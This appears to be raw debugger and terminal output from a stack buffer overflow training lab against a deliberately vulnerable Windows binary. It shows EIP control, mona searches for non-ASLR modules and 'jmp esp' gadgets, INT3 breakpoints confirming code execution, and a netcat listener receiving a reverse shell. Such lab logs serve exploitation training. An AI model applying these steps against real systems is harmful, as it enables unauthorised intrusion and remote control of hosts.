ESP 016819F8 ASCII "!!!"
EBP 41414141
EIP DEADBEEF

-------------------------------------------------------

016819F0   41414141  AAAA
016819F4   DEADBEEF  ï¾­Þ
016819F8   0A212121  !!!.

-------------------------------------------------------

!mona modules -cm rebase=false

VULNERABLE MODULES:
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
 0x08040000 | 0x08048000 | 0x00008000 | False  | True    | False |  False   | False  | -1.0- [dostackbufferoverflowgood.exe] (C:\Users\adminuser\Desktop\dostackbufferoverflowgood.exe)

-------------------------------------------------------

!mona jmp -r esp

[+] Results :
  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\adminuser\Desktop\dostackbufferoverflowgood.exe)
  0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\adminuser\Desktop\dostackbufferoverflowgood.exe)

-------------------------------------------------------

017419F9   CC               INT3
017419FA   CC               INT3
017419FB   CC               INT3

-------------------------------------------------------

root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.2.92] from (UNKNOWN) [192.168.2.145] 49274
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\adminuser\Desktop>

